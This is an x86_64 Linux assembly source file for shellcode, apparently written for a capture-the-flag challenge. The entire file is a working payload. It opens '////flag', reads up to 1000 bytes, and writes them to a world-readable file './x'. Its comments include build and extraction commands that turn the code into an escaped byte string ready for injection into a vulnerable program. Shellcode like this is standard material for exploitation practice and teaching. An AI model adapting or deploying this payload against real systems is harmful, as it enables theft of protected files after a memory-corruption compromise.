#
# read-write.s - Linux/x86_64 file read/write shellcode 
# Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Simple shellcode inspired by a challenge that shall remain unnamed to 
# prevent spoilers.
#
# Useful commands:
# $ gcc -nostdlib -static shellcode.s -o shellcode-elf
# $ objdump -M intel -d shellcode-elf
# $ strace ./shellcode-elf # doesn't work with with self-modifying code
# $ objcopy --dump-section .text=shellcode-raw shellcode-elf
# $ xxd -p shellcode-raw | tr -d '\n' | sed 's/../\\x&/g'
#

.intel_syntax noprefix
.global _start

.text
_start:
    jmp short get_buf
pop_buf:
    pop r12

    # fd = open("////flag", O_RDONLY)
    xor rax, rax
    push rax
    mov rbx, 0x67616c662f2f2f2f
    push rbx
    mov rdi, rsp                # "////flag"
    xor rsi, rsi                # O_RDONLY
    mov al, 2                   # open
    syscall

    # len = read(fd_in, buf, 1000)
    mov rdi, rax		        # fd_in
    mov rsi, r12		        # buf
    xor rdx, rdx
    mov dx, 1000		        # 1000
    xor rax, rax		        # read
    syscall

    mov r13, rax                # save len

    # fd_out = open("./x", O_WRONLY | O_CREAT | O_TRUNC, 0644)
    xor rax, rax
    mov rbx, 0x782f2f2e
    push rbx
    mov rdi, rsp                # ".//x"
    xor rsi, rsi
    mov si, 577                 # O_WRONLY | O_CREAT | O_TRUNC
    xor rdx, rdx
    mov dx, 0644                # 0644
    mov al, 2                   # open
    syscall

    # write(fd_out, buf, len)
    mov rdi, rax                # fd_out
    xor rax, rax
    mov rsi, r12                # buf
    mov rdx, r13                # len
    mov al, 1                   # write
    syscall

    # exit(0)
    xor rax, rax
    xor rdi, rdi                # 0
    mov al, 60                  # exit
    syscall

get_buf:
    call pop_buf
buf:
    .skip 1000
